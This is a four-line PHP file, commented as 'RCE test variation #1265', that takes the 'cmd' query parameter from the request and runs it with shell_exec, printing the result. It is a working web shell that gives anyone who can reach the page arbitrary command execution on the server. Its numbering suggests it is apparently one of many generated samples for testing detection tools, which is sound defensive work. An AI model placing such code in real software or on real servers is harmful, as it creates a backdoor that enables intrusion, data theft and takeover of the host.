<?php
// RCE test variation #1265
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>